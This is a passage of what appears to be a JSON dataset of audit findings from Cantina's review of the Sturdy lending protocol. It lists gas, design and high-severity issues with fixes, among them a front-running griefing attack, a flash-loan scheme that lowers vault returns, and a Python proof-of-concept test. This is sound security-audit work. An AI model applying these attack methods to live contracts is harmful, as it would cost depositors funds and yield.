      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54522",
      "title": "Allowing more maximum and limit values to make the DebtManager more robust ",
      "impact": "LOW",
      "content": "## DebtManager Constraints Improvement\n\n## Context\nDebtManager.sol#L11\n\n## Description\nAdding more constraints and limits to the DebtManager would make the system more stable.\n\n## Recommendation\nConsider adding the following constraints to the system:\n\n- **maxAPR for silos**: If a silo has an APR that exceeds the maxAPR, cease all interactions with it. No additional liquidityRequests or allocations should be made. For instance, an APR of one million percent would suggest that something is fundamentally flawed within the silo or that the interest rates have been incorrectly set.\n  \n- **silo.upperLimit for requestLiquidity**: There could be an upperLimit on how much a silo is allowed to request depending on its utilizationRate. Currently, there only exists a max_debt.\n\n- **upperLimit for all silos for requestLiquidity**: There could be an upperLimit in percentage of vault.totalAssets for requestLiquidity. Currently, all the available liquidity could be used to fulfill a requestLiquidity.\n\n- **availableForRequests per silo**: A boolean flag that can be set for each silo by the owner, indicating whether it is available for requestLiquidity from other silos. The default could be true.\n\n- **SiloGateway.setUtilizationLimit max value**: If a new utilization limit is set, check if it is lower or equal to ONE.\n\n## Sturdy\nWe added some more constraints and addressed them in ChainSecurity commit 33a4136b. It has the utilizationLimit per silo and the total utilization limit of the vault (aggregator).\n\n## Cantina\nFixed. Silo-specific utilization limits and a global utilization limit were added.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54521",
      "title": "Variable naming inconsistencies ",
      "impact": "LOW",
      "content": "## Summary of Naming Conventions\n\n## Context\nDebtManager.sol#L11\n\n## Description\nCurrently, there are multiple different names used to refer to the same thing in the codebase. A silo is called **strategy** in the vault and is sometimes referred to as **pool** in the contracts. The **Vault** is called **Aggregator** in DebtManager.\n\n## Recommendation\nUse the names defined by Yearn Finance in the Vault.\n\n## Status\n- **Sturdy:** Addressed in commit `77c364a4`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54520",
      "title": "Assumption of direction correlation between lending APR and utilisation may be false ",
      "impact": "LOW",
      "content": "## Context\n**File:** SiloGateway.sol  \n**Lines:** L76-L81\n\n## Description\nThe JIT liquidity feature allows shifting of liquidity from other lenders to the requested lender should the utilisation rate exceed the utilisation target, so that the lent liquidity benefits from higher lending APR. In other words, there is an assumption made that greater utilisation rates is directly correlated with lending/borrow APRs.\n\nWhile this correlation may be true for AaveV3 and CompoundV3 kink interest rate models, it is not the case for a time-weighted interest rate/variable rate v2 model that FraxLend uses. \n\nLooking at the pair dashboard, at the time of writing, gOHM/FRAX has 67.53% utilisation with 8.8% lending APR, while sfrxETH/FRAX has 74.11% utilisation with 2.1% lending APR. Hence, there could be sub-optimal liquidity allocation as a result of the JIT feature.\n\n## Recommendation\nThe direct correlation assumption between lending APR and utilisation should be verified when integrating a new silo.\n\n## Sturdy\nAcknowledged.\n\n## Cantina\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54519",
      "title": "Consider a manualAllocation role for DebtManager ",
      "impact": "LOW",
      "content": "## DebtManager Implementation Overview\n\n## Context\nDebtManager.sol#L157\n\n## Description\nIn the current implementation, the DebtManager has three roles:\n- Owner\n- Whitelisted Gateway mapping\n- zkVerifier\n\nOnly the owner can call `DebtManager.manualAllocation`.\n\n## Recommendation\nAdding and removing new lenders is a very powerful operation and should require multiple signatures or a governance process. On the other hand, the ability to call `manualAllocation` is still a trusted operation, but it has no indirect access to funds. Therefore, consider adding another role called `manualAllocation` role.\n\n## Sturdy\nAddressed in commit 094f6b9a.\n\n## Cantina\nFixed. A manual allocator was added.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54518",
      "title": "Smaller improvements and cleanup recommendations ",
      "impact": "LOW",
      "content": "## Context: DebtManager.sol\n\n## Description \nThis issue outlines a couple of small improvements that may be applied to the codebase.\n\n## Recommendation \nConsider applying the following recommendations:\n\n- **Unused Imports:**  \n  ```solidity\n  import {IERC4626} from \"@openzeppelin/contracts/interfaces/IERC4626.sol\";\n  ```\n  Consider removing this import.\n\n- **Public State Variables Instead of Getter Functions:**  \n  Using a public state variable instead of a getter function is a common pattern in Solidity. This can also be applied to the `_whitelistedGateway` and `_pairToLender` mappings.\n\n- **Higher Solidity Version:**  \n  Consider upgrading to a more recent Solidity version than `0.8.18`.\n\n- **More Granular Error Types:**  \n  For example, use `AG_NOT_ZK_VERIFIER` if a caller is not the zkVeriﬁer.\n\n## Sturdy\nAddressed in commit `18d5a4ae`.\n\n## Cantina\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54517",
      "title": "_manualAllocation() can be unchecked ",
      "impact": "GAS",
      "content": "## DebtManager.sol Analysis\n\n## Context\n**Location:** `DebtManager.sol#L300-L332`\n\n## Description\nThe mathematical operations performed in the `_manualAllocation()` function are as follows:\n\n- `++i` for-loop increment\n- `lenderData.current_debt - position.debt` which has been safety checked in the line above it.\n\n## Recommendation\nThe entire function can be wrapped in an unchecked block.\n\n## Status\n- **Sturdy:** Addressed in commit `8ba7fe4e`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54516",
      "title": "Unnecessary calculation when lenderData.current_debt == requiredAmount ",
      "impact": "GAS",
      "content": "## Code Analysis\n\n## Context\n`DebtManager.sol#L234-L238`\n\n## Description\nIf `lenderData.current_debt == requiredAmount`, the calculated `newDebt` will be 0, which is the initial value.\n\n## Recommendation\nDrop the equality case.\n```diff\n- if (lenderData.current_debt >= requiredAmount) {\n+ if (lenderData.current_debt > requiredAmount) {\n```\n\n## Status\n- **Sturdy**: Addressed in commit `35e304db`.\n- **Cantina**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54515",
      "title": "Variable swapping can be more eﬃcient ",
      "impact": "GAS",
      "content": "## Context\n\n**File:** DebtManager.sol  \n**Line Range:** L131-L133\n\n## Description\n\nSolidity has a way to swap two variable values in a single line that's more gas efficient, instead of requiring a third variable.\n\n## Recommendation\n\nImplement Solidity's native variable swapping:\n\n```solidity\n- address temp = lenders[i];\n- lenders[i] = lenders[j];\n- lenders[j] = temp;\n+ (lenders[i], lenders[j]) = (lenders[j], lenders[i]);\n```\n\n## Sturdy\n\nAcknowledged. This part would be removed since we are going to implement the selection sort with the stop condition.\n\n## Cantina\n\nFixed in the implementation of selection sort.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54514",
      "title": "Remove oracle calls from the inner loop in DebtManager.sortLendersWithAPR ",
      "impact": "GAS",
      "content": "## DebtManager Optimization\n\n## Context\n**File:** DebtManager.sol  \n**Line:** 128  \n\n## Description\nIt could be cheaper from a gas perspective to collect first the APR and store them in memory instead of performing multiple contract calls to the oracle within the inner loop to request them.  \n`oracle.getExpectedApr(lenders[i], 0)`\n\n## Recommendation\nFirst, iterate once over the lender to calculate the APR and store them in memory. Afterwards, sort based on the APR.\n\n## Sturdy\nAcknowledged. We will change the sort logic based on the silo's available withdrawal amount, not the APR value. In this case, we will follow the recommendation to reduce gas.\n\n## Cantina\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54513",
      "title": "selection sort with stop condition instead of bubble sort wouldn't require to sort the entire list in sortLendersWithAPR ",
      "impact": "GAS",
      "content": "## DebtManager Optimization\n\n## Context\n- **File**: `DebtManager.sol`\n- **Line**: 119\n\n## Description\nOne alternative design instead of bubble sort could be to directly sort in `requestLiquidity` with selection sort. This would be more efficient because it wouldn't require sorting the entire list. Selection sort could track the amount of already sorted list elements and stop after `requiredAmount` is reached.\n\n## Recommendation\nConsider using selection sort in the `requestLiquidity` function and track the amount available in sorted silos. Stop after the first `n` elements if the required amount is reached. The choice of the right sorting algorithm depends on the number of expected elements in the lender array. If only a low number is expected, a simple bubble sort might be sufficient.\n\n## Status\n- **Sturdy**: Addressed in commit `6a2b1461`. Since we use selection sort, the `sortWithLenderAPR` function has been removed.\n- **Cantina**: Fixed. Selection sort is now used to search for and select the most appropriate silo.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54512",
      "title": "Enforce correct role management for DebtManager ",
      "impact": "LOW",
      "content": "## DebtManager Role Requirements\n\n## Context\nDebtManager.sol#L241\n\n## Description\nThe DebtManager needs to hold multiple roles in the VaultV3 to be able to call the needed Vault functions:\n- **Roles.REPORTING_MANAGER** for `process_report`\n- **Roles.DEBT_MANAGER** for `update_debt`\n\nThere is currently no factory contract nor another function that ensures the correct setup of the DebtManager. It is also not clear which address is assigned to the `role_manager` in the VaultV3. This is only the `msg.sender` in the AggregatorFactory.\n\n## Recommendation\nCreate a FactoryContract which ensures the correct setup of a new VaultV3 with the DebtManager.\n\n## Sturdy\nAcknowledged. `role_manager` should be the owner of the Aggregator (the vault). Everyone can create their own aggregator via AggregatorFactory and in this case, the creator would be `role_manager`. Regarding the debt manager, it can be the specific contract or user itself. In other words, the creators can make their own debt manager contract or manually manage the debt of the aggregator via calling `update_debt()` manually.\n\n## Cantina\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54511",
      "title": "Newly added lender without an aprOracle entry would block DebtMan- ager.sortLendersWithAPR ",
      "impact": "MEDIUM",
      "content": "## DebtManager Overview\n\n## Context\n**File:** `DebtManager.sol`  \n**Line:** 119\n\n## Description\nEach lender added to the DebtManager requires an entry in the `AprOracle` contract. If a newly added lender doesn't have an oracle entry in the `AprOracle`, it would block the entire sorting because `getExpectedApr` would revert.\n\nFor context, see the comment added within the `AprOracle` contract below:\n\n```solidity\ncontract AprOracle {\n    mapping(address => address) public oracles;\n\n    function getExpectedApr(\n        address _strategy,\n        int256 _debtChange\n    ) external view returns (uint256) {\n        address oracle = oracles[_strategy];\n        // Will revert if an oracle is not set.\n        return IOracle(oracle).aprAfterDebtChange(_strategy, _debtChange);\n    }\n\n    function setOracle(address _strategy, address _oracle) external {\n        require(msg.sender == IStrategy(_strategy).management(), \"!authorized\");\n        oracles[_strategy] = _oracle;\n    }\n}\n```\n\n## Recommendation\nConsider enforcing that the `aprOracle` has an entry before adding the lender to the DebtManager.\n\n## Status\n- **Sturdy:** Addressed in commit `a1357196`.\n- **Cantina:** Fixed.",
      "summary": "\nThe DebtManager contract has a bug that causes it to not function properly when a new lender is added. This is because the lender needs to have an entry in the AprOracle contract, but if they do not, it will block the sorting process. To fix this, the AprOracle contract needs to be updated to ensure that all lenders have an entry before being added to the DebtManager. This bug has been fixed in the latest commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54510",
      "title": "DebtManager.manualAllocation is not considering the respect minimum idle feature in VaultV3.update_debt ",
      "impact": "MEDIUM",
      "content": "## DebtManager Overview\n\n## Context\n**File:** DebtManager.sol  \n**Line:** 300\n\n## Description\nThe `manualAllocation` function allows for the allocation of debt for each silo in the `VaultV3` by increasing or decreasing it. \n\nThe `VaultV3.update_debt` function has a feature that respects the minimum total idle amount (see `VaultV3.vy`, Line 935). This constraint defines the minimum amount of assets in the `VaultV3` that should not be invested into silos. \n\nIn the case of decreasing or withdrawing debt from a silo, if the minimum total idle constraint is violated, it would withdraw more funds than actually requested from the `update_debt` call. This fact is not considered in the `manualAllocation` function. It assumes the passed parameter `new_debt` to the `update_debt` will change the debt accordingly, which can lead to a revert of the `manualAllocation` function.\n\n## Recommendation\nThe array passed into the `manualAllocation` function needs to consider the minimum idle constraint for each position. An alternative solution could be to consider the actual new debt returned by the `update_debt` function. A difference here needs to be considered in the upcoming `update_debt` calls for the successor.\n\n## Sturdy\nAcknowledged. When `zkVerifier` or the admin makes the allocation data off-chain, they need to consider the `minimum_idle_amount` and each silo's `maxDebt` amount to avoid revert cases and allocate correctly.\n\n## Cantina\nAcknowledged.",
      "summary": "\nThe DebtManager Overview bug report discusses an issue with the manualAllocation function in the DebtManager.sol file. The function is used to adjust the debt for each silo in the VaultV3 contract. However, there is a problem when decreasing or withdrawing debt from a silo, as the function does not take into account the minimum total idle amount constraint set in the VaultV3 contract. This can lead to a revert of the function and incorrect allocation of debt. The recommendation is to update the function to consider the minimum idle constraint for each position or to use the actual new debt returned by the update_debt function. The developers have acknowledged the issue and suggest that when allocating data off-chain, the minimum idle amount and each silo's maximum debt should be considered to avoid any revert cases and ensure correct allocation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54509",
      "title": "DebtManager.requestLiquidity from other silos even if not needed at all ",
      "impact": "HIGH",
      "content": "## Context: DebtManager.sol#L218\n\n## Description\nThe `requestLiquidity` function allows users to request liquidity from other silos to fulfill a borrowAsset operation. A silo could be any other lending protocol that implements the ERC4626 standard.\n\nThe aggregator, a `YearnVaultV3`, is responsible for managing these silos. It maintains a balance of uninvested funds, termed `totalIdle`, which does not earn interest.\n\n```solidity\nif (requiredAmount > totalIdle) {\n    unchecked {\n        requiredAmount -= totalIdle;\n    }\n}\n```\n\nFirst, the `totalIdle` should be used to fulfill the liquidity request. If more liquidity is needed, it should be requested from the silos. After the `if` statement, the loop iterates over the silos to fulfill the remaining `requiredAmount`.\n\nHowever, in the case that `requiredAmount <= totalIdle`, the `requiredAmount` could be fulfilled directly from the `totalIdle`. No additional silo requests are needed. \n\nOtherwise, too many funds are withdrawn from the silos and will remain in `totalIdle`, resulting in a loss of interest. This case is currently not considered. The full `requiredAmount` will be requested from silos in case `requiredAmount <= totalIdle`.\n\n## Recommendation\nOnly request liquidity from silos if `requiredAmount > totalIdle`. The loop iteration over the silos should happen inside the `if` statement:\n\n```solidity\nif (requiredAmount > totalIdle) {\n    unchecked {\n        requiredAmount -= totalIdle;\n    }\n    for (uint256 i; i < lenderCount; ++i) {\n        // ...\n    }\n}\n```\n\n## Sturdy\nAddressed in ChainSecurity commit `e1c04047`.\n\n## Cantina\nFixed.",
      "summary": "\nThis bug report is about a function in the DebtManager.sol code called `requestLiquidity`. This function allows users to request money from other lending protocols to complete a borrowing operation. The problem is that the code currently requests too much money from these protocols, resulting in a loss of interest. To fix this, the code should only request money from the protocols if it is needed, and the code should be rearranged to make sure this happens correctly. This issue has already been addressed in a recent update to the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54508",
      "title": "Collateral & debt position may be accounted to SiloGateway instead of user ",
      "impact": "HIGH",
      "content": "## SiloGateway Documentation\n\n## Context\n**File**: SiloGateway.sol  \n**Lines**: 92-96\n\n## Description\nThe `borrowAsset()` function is intended to add collateral and borrow the asset on behalf of the user. However, this feature may not be supported by some protocols. For instance, certain protocols may accrue the collateral and debt to the caller, specifically, the `SiloGateway`.\n\nAn example of this is `FraxLend`, which was one of the protocols used for end-to-end tests. Below is a code snippet taken from the `borrowAsset()` function of `FraxLendPair`:\n\n```solidity\nif (_collateralAmount > 0) {\n    _addCollateral(msg.sender, _collateralAmount, msg.sender);\n}\n\nfunction _addCollateral(\n    address _sender,\n    uint256 _collateralAmount,\n    address _borrower\n) internal {\n    userCollateralBalance[_borrower] += _collateralAmount;\n}\n```\n\nThis results in the user's collateral being permanently locked up, even if the debt is repaid on behalf of the contract.\n\n## Recommendation\nProtocols need to be carefully checked to ensure that borrowing on behalf of the user is supported.\n\n## Sturdy\n**Status**: Acknowledged  \n(See commit b0a71073.) We will use this contract when we deploy our Sturdy V2 silos, which have the feature of borrowing on behalf of the user, or implement another gateway contract for the Aave V3 and Compound V3 silos.\n\n## Cantina\n**Status**: Acknowledged.",
      "summary": "\nThis bug report is about a function called `borrowAsset()` in a file called `SiloGateway.sol`. This function is supposed to add collateral and borrow an asset for the user, but it may not work properly with some protocols. One example is `FraxLend`, where the user's collateral can get permanently locked up even after the debt is repaid. The recommendation is to carefully check protocols to make sure they support borrowing on behalf of the user. The bug has been acknowledged and will be addressed in future versions of the software.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54507",
      "title": "Prevent grieﬁng attack on DebtManager.manualAllocation ",
      "impact": "HIGH",
      "content": "## DebtManager.sol - Manual Allocation Overview\n\n## Context\n- **File**: DebtManager.sol\n- **Line**: 305\n\n## Description\nThe manual allocation will always be calculated based on a system state `s`. After the transaction gets minted, there could be a completely new state `s'`.\n\nAn attacker could try to frontrun the `manualAllocation` transaction to produce a revert. There may be a financial incentive for the attacker to do so.\n\nThe manual allocation aims to optimize resource allocation by keeping only the `minimum_total_idle` amount, along with an optional buffer, in `idle`. An attacker could exploit this by withdrawing an amount equal to `(buffer + 1)` from the vault, thereby triggering a revert in the `manualAllocation`.\n\nThe revert in the manual allocation would happen in the `vaultV3.update_debt` function (see VaultV3.vy#L992). A silo position `debt_update` would use all the remaining funds from `idle`. The following silo `debt_update` position in the loop would revert because `total_idle == minimum_total_idle`.\n\n## Recommendation\nAdd the following check to the `manualAllocation` loop:\n\n```solidity\n// deposit/increase not possible because minimum total idle reached\nif (position.debt > lenderData.current_debt && \n    aggregator.totalIdle() == aggregator.minimum_total_idle()) {\n    continue;\n}\n```\n\n## Sturdy\n- Addressed in commit `9e1fa3cb`.\n\n## Cantina\n- Fixed, although the recommendation should have been as follows:\n```solidity\n// deposit/increase not possible because minimum total idle not reached\nif (position.debt > lenderData.current_debt && \n    aggregator.totalIdle() <= aggregator.minimum_total_idle()) {\n    continue;\n}\n```",
      "summary": "\nThis bug report is about a function called `manualAllocation` in a file called `DebtManager.sol` on line 305. This function is used to optimize resource allocation, but it has a vulnerability that could be exploited by attackers. The report recommends adding a check to prevent this exploit and states that the issue has been addressed in a recent commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54506",
      "title": "JIT liquidity breaks once ﬁrst lender has 0 current_debt ",
      "impact": "HIGH",
      "content": "## DebtManager.sol Analysis\n\n## Context\n**File:** `DebtManager.sol`  \n**Line:** 244\n\n## Description\nThe internal method `_update_debt()` of Yearn's V3 vault reverts under the following conditions:\n\n- **Unchanged debt:** \n  - `assert new_debt != current_debt, \"new debt equals current debt\"`\n\n- **Reducing debt:**\n  - `assert withdrawable != 0, \"nothing to withdraw\"`\n  - `assert unrealised_losses_share == 0, \"strategy has unrealised losses\"`\n\n- **Increasing debt:**\n  - `assert new_debt <= self.strategies[strategy].max_debt, \"target debt higher than max debt\"`\n  - `assert max_deposit != 0, \"nothing to deposit\"`\n  - `assert total_idle > minimum_total_idle, \"no funds to deposit\"`\n\nThe first revert condition is of interest. When the first lender in the `_lenders` array has all its liquidity transferred to other lenders, its `current_debt` becomes 0. Further attempts to transfer liquidity from other lenders will trigger a revert since the function sets `newDebt` of this first lender to 0, effectively equating it to `current_debt`.\n\n## Proof of Concept\nHere's a test case that can be added into `tests/e2e/fraxlend/test_fraxlend_deposit_allocation_requestLiquidity_flow.py`.\n\n```python\nimport ape\nfrom utils.constants import ROLES\n\nFRAX_CRV_PAIR_ADDRESS = '0x3835a58CA93Cdb5f912519ad366826aC9a752510'\nFRAX_CVX_PAIR_ADDRESS = '0xa1D100a5bf6BFd2736837c97248853D989a9ED84'\nFRAX_WBTC_PAIR_ADDRESS = '0x32467a5fc2d72d21e8dce990906547a2b012f382'\n\ndef test_failing_requestLiquidity_when_first_lender_has_zero_current_debt(frax, crv, gov, accounts,\n    create_aggregator, create_debt_manager, create_frax_lender, mint, data_provider, create_silo_gateway,\n    apr_oracle, frax_lend_apr_oracle):\n    \n    #############\n    ### SETUP ###\n    #############\n    \n    # Deploy CRV lender\n    crv_lender = create_frax_lender(FRAX_CRV_PAIR_ADDRESS, 'frax/crv lender', '1')\n    \n    # Deploy CVX lender\n    cvx_lender = create_frax_lender(FRAX_CVX_PAIR_ADDRESS, 'frax/cvx lender', '1')\n    \n    # Deploy WBTC lender\n    wbtc_lender = create_frax_lender(FRAX_WBTC_PAIR_ADDRESS, 'frax/wbtc lender', '1')\n    \n    # Deploy FRAX aggregator\n    silo_datas = [\n        {\n            \"lender\": crv_lender.address,\n            \"maxDebt\": 50_000 * 10 ** 18,\n        },\n        {\n            \"lender\": cvx_lender.address,\n            \"maxDebt\": 50_000 * 10 ** 18,\n        },\n        {\n            \"lender\": wbtc_lender.address,\n            \"maxDebt\": 50_000 * 10 ** 18,\n        }\n    ]\n    aggregator, accountant = create_aggregator(frax, silos=silo_datas)\n    \n    # Deploy debt manager\n    manager = create_debt_manager(aggregator)\n    \n    # Set oracle\n    apr_oracle.setOracle(crv_lender.address, frax_lend_apr_oracle.address, sender=gov)\n    apr_oracle.setOracle(cvx_lender.address, frax_lend_apr_oracle.address, sender=gov)\n    apr_oracle.setOracle(wbtc_lender.address, frax_lend_apr_oracle.address, sender=gov)\n    \n    aggregator.set_role(\n        manager.address,\n        ROLES.DEBT_MANAGER | ROLES.REPORTING_MANAGER,\n        sender=gov,\n    )\n    \n    # Add CRV, CVX FraxLender to manager\n    manager.addLender(crv_lender.address, sender=gov)\n    manager.addLender(cvx_lender.address, sender=gov)\n    manager.addLender(wbtc_lender.address, sender=gov)\n    \n    # Deploy silo gateway\n    silo_gateway = create_silo_gateway(manager)\n    manager.setWhitelistedGateway(silo_gateway.address, True, sender=gov)\n    manager.setPairToLender(FRAX_CRV_PAIR_ADDRESS, crv_lender.address, sender=gov)\n    manager.setPairToLender(FRAX_CVX_PAIR_ADDRESS, cvx_lender.address, sender=gov)\n    manager.setPairToLender(FRAX_WBTC_PAIR_ADDRESS, wbtc_lender.address, sender=gov)\n    \n    # User Deposits 30000 FRAX\n    user1 = accounts[1]\n    depositAmount = 30000 * 10 ** 18\n    \n    # Prepare FRAX\n    mint('FRAX', depositAmount, user1)\n    \n    # Approve aggregator\n    frax.approve(aggregator.address, depositAmount, sender=user1)\n    \n    # Deposit\n    aggregator.deposit(depositAmount, user1.address, sender=user1)\n    \n    # Allocations\n    positions = [\n        {\n            \"lender\": crv_lender.address,\n            \"debt\": 10000 * 10 ** 18\n        },\n        {\n            \"lender\": cvx_lender.address,\n            \"debt\": 10000 * 10 ** 18\n        },\n        {\n            \"lender\": wbtc_lender.address,\n            \"debt\": 10000 * 10 ** 18\n        }\n    ]\n    manager.manualAllocation(positions, sender=gov)\n    \n    # Sort lenders: [WBTC_LENDER, CVX_LENDER, CRV_LENDER]\n    manager.sortLendersWithAPR(sender=gov)\n    lenders = manager.getLenders()\n    assert lenders[0] == wbtc_lender.address\n    assert lenders[1] == cvx_lender.address\n    assert lenders[2] == crv_lender.address\n    \n    # Change utilizationLimit to 74.2% to make requestLiquidity call happen\n    silo_gateway.setUtilizationLimit(74_200, sender=gov)\n    \n    # User5 through gateway contract borrow 5000 FRAX from crv_lender and success\n    user5 = accounts[5]\n    borrowAmount = 5000 * 10 ** 18\n    \n    # Mint CRV for collateral\n    mint('CRV', borrowAmount * 8, user5)\n    \n    # Approve for collateral\n    crv.approve(silo_gateway.address, int(borrowAmount * 8), sender=user5)\n    \n    # 20K collateral deposit and Borrow 5K\n    silo_gateway.borrowAsset(FRAX_CRV_PAIR_ADDRESS, borrowAmount, int(borrowAmount * 8), crv.address,\n                             user5.address, sender=user5)\n    \n    # At this point however, it has drained the first lender\n    assert aggregator.strategies(wbtc_lender.address).current_debt == 0\n    \n    # Attempt to borrow again, will fail because first lender has already been drained\n    borrowAmount = 1000 * 10 ** 18\n    with ape.reverts(\"new debt equals current debt\"):\n        silo_gateway.borrowAsset(FRAX_CRV_PAIR_ADDRESS, borrowAmount, 0, crv.address, user5.address,\n                                 sender=user5)\n```\n\n## Recommendation\nContinue if `current_debt` is 0:\n```python\nif (lenders[i] == requestingLender) continue;\nif (lenders[i] == requestingLender || lenderData.current_debt == 0) continue;\n```\n\n## Notes\n- **Sturdy:** Addressed in commit `3109aad2`.\n- **Cantina:** Fixed. It is noted that these checks have been refactored and shifted to `_getAvailableAmountsAndDatas()` in subsequent commits.",
      "summary": "\nThis bug report discusses an issue with the internal method `_update_debt()` in Yearn's V3 vault. The function reverts under certain conditions, including when the first lender in the `_lenders` array has all its liquidity transferred to other lenders. This is because the function sets the `newDebt` of this first lender to 0, effectively equating it to `current_debt`. The report includes a proof of concept test case and recommends adding a condition to continue if `current_debt` is 0. The bug has been addressed in a recent commit, but it is noted that the checks have been refactored in subsequent commits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54505",
      "title": "DebtManager.requestLiquidity can be exploited to reduce returns of vault user ",
      "impact": "HIGH",
      "content": "## Vulnerability Analysis of SiloGateway.borrowAsset\n\n## Context\nDebtManager.sol#L190\n\n## Description\nThe `SiloGateway.borrowAsset` allows one to request liquidity from other silos to fulfill a high borrow amount if their own liquidity is not sufficient. There are no limitations on how much liquidity can be requested from other silos. This could amount to the entire available liquidity across all silos, potentially making it exploitable by an attacker. The attack requires some initial assets, but a flash loan could also be utilized.\n\nAn attacker can take a flash loan in the collateral of the silo with the lowest APR. Afterward, the `SiloGateway.borrowAsset` is called to request all available liquidity from other silos. Following a successful borrow transaction, the open position is immediately repaid.\n\nThe repayment results in a high amount of unused liquidity (idle) in the silo. The attacker receives the funds back from the repayment and pays back the flash loan. In most lending protocols, a high amount of idle liquidity lowers the APR for lenders. In this scenario, the silo with the lowest APR ends up with a large amount of unused liquidity, further reducing its APR. Consequently, all the available liquidity of the aggregator (vault) will be concentrated in that silo.\n\nThere is also an economic 